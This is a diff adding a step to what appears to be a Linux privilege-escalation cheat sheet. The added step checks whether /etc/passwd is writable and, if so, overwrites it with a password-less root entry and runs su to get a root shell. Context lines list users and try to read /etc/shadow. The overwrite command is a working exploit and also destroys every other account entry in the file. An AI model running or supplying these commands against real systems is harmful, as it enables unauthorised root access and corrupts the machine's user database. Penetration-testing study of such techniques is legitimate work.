@@ -63,6 +63,15 @@ cat /etc/passwd
 grep -vE "nologin | false" /etc/passwd
 ```
 
+* Check permissions of /etc/passwd and /etc/shadow
+```
+ls -la /etc/passwd
+
+//writable
+echo root::0:0:root:/root:/bin/bash > /etc/passwd
+su
+```
+
 * Can we access /etc/shadow?
 ```
 cat /etc/shadow
